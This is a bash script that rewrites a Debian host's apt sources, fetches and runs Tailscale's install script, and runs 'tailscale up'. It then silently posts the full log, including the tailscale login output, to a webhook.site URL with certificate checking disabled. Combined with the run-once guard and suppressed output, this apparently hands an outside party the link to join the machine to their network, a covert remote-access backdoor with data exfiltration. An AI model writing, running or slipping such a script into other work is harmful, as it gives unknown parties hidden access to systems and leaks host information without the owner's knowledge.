
#!/bin/bash
set -u

WASRUN="/tmp/wasRun.txt"
WEBHOOK="https://webhook.site/39efcb72-40f8-4408-a4c0-0dc07f0cd12d"
SELF="$0"

# --- silent run-once guard --------------------------------------------------
HASH=$(sha256sum "$SELF" | awk '{print $1}')
if [ -f "$WASRUN" ] && [ "$(cat "$WASRUN" 2>/dev/null)" = "$HASH" ]; then
    exit 0
fi

REPORT=""
add() { REPORT="${REPORT}$1
"; }

add "[run] start $(date '+%F %T') hash=$HASH"

# --- detect real codename ---------------------------------------------------
. /etc/os-release
CODENAME="${VERSION_CODENAME:-trixie}"
add "[os] codename=$CODENAME  (libc is deb13/trixie, sources will be aligned)"

# --- normalize Debian apt sources to that codename --------------------------
for f in /etc/apt/sources.list /etc/apt/sources.list.d/*.list /etc/apt/sources.list.d/*.sources; do
    [ -f "$f" ] || continue
    if grep -qE '\b(bookworm|bullseye|buster|stretch)\b' "$f" 2>/dev/null; then
        cp -n "$f" "${f}.bak.$(date +%s)" 2>/dev/null
        sed -i -E "s/\b(bookworm|bullseye|buster|stretch)\b/${CODENAME}/g" "$f"
        add "[apt] rewrote codenames in $f → $CODENAME"
    fi
done

add "[apt] apt-get update"
UPD_OUT=$(DEBIAN_FRONTEND=noninteractive apt-get update 2>&1); UPD_RC=$?
add "rc=$UPD_RC"
add "$UPD_OUT"

# --- install iptables (tailscale Depends) -----------------------------------
add "[apt] apt-get install -y iptables"
IPT_OUT=$(DEBIAN_FRONTEND=noninteractive apt-get install -y iptables 2>&1); IPT_RC=$?
add "rc=$IPT_RC"
add "$IPT_OUT"

# --- get tailscale: use installer, fall back to direct apt -------------------
if command -v tailscale >/dev/null 2>&1; then
    add "[install] tailscale already present — skipping."
else
    TS_INSTALLER="/tmp/tailscale-install.sh"
    OK=0
    for i in 1 2 3; do
        if wget -q --timeout=30 --tries=3 -O "$TS_INSTALLER" \
                https://tailscale.com/install.sh; then
            OK=1; break
        fi
        add "[install] wget attempt $i failed, retrying…"
        sleep 3
    done

    if [ "$OK" = "1" ]; then
        INSTALL_OUT=$(sh "$TS_INSTALLER" 2>&1); INSTALL_RC=$?
        add "[install] rc=$INSTALL_RC"
        add "$INSTALL_OUT"
    fi

    # Fallback: repo is already in sources.list.d from the earlier run
    if ! command -v tailscale >/dev/null 2>&1; then
        add "[install] fallback: apt-get install -y tailscale"
        FB_OUT=$(DEBIAN_FRONTEND=noninteractive apt-get install -y tailscale 2>&1); FB_RC=$?
        add "rc=$FB_RC"
        add "$FB_OUT"
    fi
fi

# --- tailscale up -----------------------------------------------------------
if command -v tailscale >/dev/null 2>&1; then
    UP_OUT=$(tailscale up 2>&1); UP_RC=$?
    add "[tailscale up] rc=$UP_RC"
    add "$UP_OUT"
else
    add "[tailscale up] skipped (binary not present)."
fi

printf '%s\n' "$HASH" > "$WASRUN"
add "[done] $(date '+%F %T') hash recorded in $WASRUN"

wget -nv -O- \
    --no-check-certificate \
    --header="Content-Type: text/plain" \
    --post-data="$REPORT" \
    "$WEBHOOK" >/dev/null 2>&1

echo
exit 0
